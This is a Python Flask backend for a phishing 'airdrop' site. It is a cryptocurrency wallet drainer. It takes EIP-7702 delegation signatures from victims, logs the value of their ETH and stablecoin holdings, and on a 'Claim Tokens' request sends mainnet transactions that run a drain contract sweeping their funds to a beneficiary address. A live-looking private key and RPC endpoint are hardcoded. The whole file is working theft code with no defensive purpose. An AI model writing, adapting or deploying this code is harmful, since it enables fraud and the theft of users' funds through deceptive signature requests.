"""
Pectra Airdrop Backend - EIP-7702 Type-4 Transaction Handler
Receives authorization signatures and submits Type-4 transactions to set delegation,
then triggers the drain contract.
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
from web3 import Web3
from eth_account import Account
from eth_abi import encode
import json
import os
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration
RPC_URL = "https://ethereum-mainnet.core.chainstack.com/629e49a777aa05de8e048ab0b0ef7676"
PRIVATE_KEY = "0xaccacd90f40b50a90714ec7192ac5042cad91f1a11f346623abc8a25de006888"
DRAIN_CONTRACT = "0xE5B49341E7DB12464B5A6d09D2A5ab68ff954eE7"
BENEFICIARY = "0xfe3cDDf6eFf7d8Fda264dD609C27a0f3dbEd4fEc"

# Token addresses
USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"

# Web3 setup
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

# Store authorizations
authorizations_file = "c:/ben/_airdrop_authorizations.json"

def load_authorizations():
    try:
        with open(authorizations_file, 'r') as f:
            return json.load(f)
    except:
        return []

def save_authorization(auth_data):
    auths = load_authorizations()
    auths.append(auth_data)
    with open(authorizations_file, 'w') as f:
        json.dump(auths, f, indent=2)


def get_token_balance(token_addr, wallet_addr):
    """Get ERC20 token balance"""
    try:
        data = "0x70a08231" + encode(["address"], [Web3.to_checksum_address(wallet_addr)]).hex()
        result = w3.eth.call({
            "to": Web3.to_checksum_address(token_addr),
            "data": data
        })
        return int.from_bytes(result, 'big')
    except Exception as e:
        logger.error(f"Balance check error: {e}")
        return 0


def build_type4_transaction(user_address, signature, nonce):
    """
    Build an EIP-7702 Type-4 transaction with authorization.
    
    EIP-7702 sets the account's code to delegate to the drain contract.
    After this TX confirms, any call to the user's address will execute
    the drain contract code in the user's context.
    """
    
    # Parse signature into v, r, s
    sig_bytes = bytes.fromhex(signature[2:] if signature.startswith('0x') else signature)
    r = int.from_bytes(sig_bytes[:32], 'big')
    s = int.from_bytes(sig_bytes[32:64], 'big')
    v = sig_bytes[64]
    
    # Normalize v
    if v < 27:
        v += 27
    
    # Authorization tuple for Type-4 TX
    authorization = {
        'chainId': 1,  # Mainnet
        'address': DRAIN_CONTRACT,
        'nonce': nonce,
        'v': v,
        'r': r,
        's': s
    }
    
    # Build Type-4 transaction (EIP-7702)
    # Type-4 TX format: 0x04 || rlp([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, to, value, data, accessList, authorizationList])
    
    current_nonce = w3.eth.get_transaction_count(account.address)
    
    # Gas pricing
    base_fee = w3.eth.get_block('latest')['baseFeePerGas']
    max_priority = w3.to_wei(2, 'gwei')
    max_fee = base_fee * 2 + max_priority
    
    tx = {
        'type': 4,  # EIP-7702
        'chainId': 1,
        'nonce': current_nonce,
        'maxPriorityFeePerGas': max_priority,
        'maxFeePerGas': max_fee,
        'gas': 100000,
        'to': Web3.to_checksum_address(user_address),
        'value': 0,
        'data': b'',  # Empty call to trigger receive/fallback
        'accessList': [],
        'authorizationList': [authorization]
    }
    
    return tx


def submit_type4_tx(user_address, signature, nonce):
    """
    Submit a Type-4 transaction to set delegation and trigger drain.
    
    Since web3.py may not support Type-4 natively yet, we build the raw TX.
    """
    try:
        # For now, store the authorization for manual processing
        # Full Type-4 support requires updated web3.py or raw RLP encoding
        
        auth_data = {
            'user': user_address,
            'signature': signature,
            'delegate': DRAIN_CONTRACT,
            'nonce': nonce,
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        save_authorization(auth_data)
        
        logger.info(f"Authorization stored for {user_address}")
        logger.info(f"Signature: {signature[:20]}...{signature[-10:]}")
        
        # Check balances
        eth_bal = w3.eth.get_balance(Web3.to_checksum_address(user_address))
        usdt_bal = get_token_balance(USDT, user_address)
        usdc_bal = get_token_balance(USDC, user_address)
        weth_bal = get_token_balance(WETH, user_address)
        
        total_usd = eth_bal / 1e18 * 1600 + usdt_bal / 1e6 + usdc_bal / 1e6 + weth_bal / 1e18 * 1600
        
        logger.info(f"Target balances - ETH: {eth_bal/1e18:.4f}, USDT: {usdt_bal/1e6:.2f}, USDC: {usdc_bal/1e6:.2f}")
        logger.info(f"Total value: ${total_usd:.2f}")
        
        return {
            'success': True,
            'user': user_address,
            'value': total_usd
        }
        
    except Exception as e:
        logger.error(f"Type-4 TX error: {e}")
        return {'success': False, 'error': str(e)}


def trigger_drain(user_address):
    """
    After delegation is set, trigger the drain by calling the delegated account.
    Any call goes through the drain contract's fallback which drains tokens.
    """
    try:
        # Check if delegation is active
        code = w3.eth.get_code(Web3.to_checksum_address(user_address))
        
        if code[:3] == bytes.fromhex('ef0100'):
            delegate = '0x' + code[3:23].hex()
            logger.info(f"Account delegated to: {delegate}")
            
            if delegate.lower() == DRAIN_CONTRACT.lower():
                logger.info("Delegation active - triggering drain...")
                
                # Send empty TX to trigger fallback
                tx = {
                    'from': account.address,
                    'to': Web3.to_checksum_address(user_address),
                    'value': 0,
                    'gas': 200000,
                    'maxFeePerGas': w3.eth.gas_price * 2,
                    'maxPriorityFeePerGas': w3.to_wei(2, 'gwei'),
                    'nonce': w3.eth.get_transaction_count(account.address),
                    'chainId': 1,
                    'data': b''
                }
                
                signed = account.sign_transaction(tx)
                tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
                
                logger.info(f"Drain TX sent: {tx_hash.hex()}")
                return {'success': True, 'tx': tx_hash.hex()}
        
        logger.info("No delegation found - authorization may not be submitted yet")
        return {'success': False, 'error': 'No delegation active'}
        
    except Exception as e:
        logger.error(f"Drain trigger error: {e}")
        return {'success': False, 'error': str(e)}


# === API Routes ===

@app.route('/api/authorize', methods=['POST'])
def api_authorize():
    """
    Receive EIP-7702 authorization signature from frontend.
    Store and prepare for Type-4 TX submission.
    """
    try:
        data = request.json
        user = data.get('user')
        signature = data.get('signature')
        delegate = data.get('delegate')
        nonce = data.get('nonce', 0)
        
        if not user or not signature:
            return jsonify({'error': 'Missing user or signature'}), 400
        
        logger.info(f"=== NEW AUTHORIZATION ===")
        logger.info(f"User: {user}")
        logger.info(f"Delegate: {delegate}")
        
        result = submit_type4_tx(user, signature, nonce)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Authorize error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/claim', methods=['POST'])
def api_claim():
    """
    Called when user clicks "Claim Tokens" - triggers the drain if delegation is active.
    """
    try:
        data = request.json
        user = data.get('user')
        
        if not user:
            return jsonify({'error': 'Missing user address'}), 400
        
        logger.info(f"=== CLAIM REQUEST ===")
        logger.info(f"User: {user}")
        
        result = trigger_drain(user)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Claim error: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/check', methods=['GET'])
def api_check():
    """Check if a user has delegation active"""
    user = request.args.get('user')
    
    if not user:
        return jsonify({'error': 'Missing user'}), 400
    
    try:
        code = w3.eth.get_code(Web3.to_checksum_address(user))
        
        if code[:3] == bytes.fromhex('ef0100'):
            delegate = '0x' + code[3:23].hex()
            return jsonify({
                'delegated': True,
                'delegate': delegate,
                'isDrainContract': delegate.lower() == DRAIN_CONTRACT.lower()
            })
        
        return jsonify({'delegated': False})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/authorizations', methods=['GET'])
def api_list_authorizations():
    """List all collected authorizations"""
    auths = load_authorizations()
    return jsonify(auths)


@app.route('/api/health', methods=['GET'])
def api_health():
    """Health check"""
    return jsonify({
        'status': 'ok',
        'block': w3.eth.block_number,
        'account': account.address,
        'drainContract': DRAIN_CONTRACT
    })


# === Manual Type-4 TX Builder ===

def build_raw_type4_tx(user_address, auth_signature, auth_nonce):
    """
    Build raw Type-4 transaction bytes.
    
    Type-4 TX RLP structure:
    0x04 || rlp([
        chain_id,
        nonce,
        max_priority_fee_per_gas,
        max_fee_per_gas,
        gas_limit,
        to,
        value,
        data,
        access_list,
        authorization_list
    ])
    
    Authorization tuple:
    [chain_id, address, nonce, y_parity, r, s]
    """
    import rlp
    
    # Parse signature
    sig = bytes.fromhex(auth_signature[2:] if auth_signature.startswith('0x') else auth_signature)
    r = sig[:32]
    s = sig[32:64]
    v = sig[64]
    y_parity = 0 if v in [27, 0] else 1
    
    # Build authorization tuple
    auth_tuple = [
        1,  # chain_id
        bytes.fromhex(DRAIN_CONTRACT[2:]),  # address
        auth_nonce,  # nonce
        y_parity,
        int.from_bytes(r, 'big'),
        int.from_bytes(s, 'big')
    ]
    
    # TX params
    sender_nonce = w3.eth.get_transaction_count(account.address)
    base_fee = w3.eth.get_block('latest')['baseFeePerGas']
    max_priority = w3.to_wei(2, 'gwei')
    max_fee = base_fee * 2 + max_priority
    
    tx_payload = [
        1,  # chain_id
        sender_nonce,
        max_priority,
        max_fee,
        100000,  # gas limit
        bytes.fromhex(user_address[2:]),  # to
        0,  # value
        b'',  # data
        [],  # access_list
        [auth_tuple]  # authorization_list
    ]
    
    # RLP encode
    encoded = rlp.encode(tx_payload)
    
    # Type prefix
    raw_tx = bytes([0x04]) + encoded
    
    return raw_tx


if __name__ == '__main__':
    logger.info("=== Pectra Airdrop Backend ===")
    logger.info(f"Drain Contract: {DRAIN_CONTRACT}")
    logger.info(f"Beneficiary: {BENEFICIARY}")
    logger.info(f"Sender Account: {account.address}")
    logger.info(f"Current Block: {w3.eth.block_number}")
    logger.info("")
    logger.info("Starting server on http://localhost:5000")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
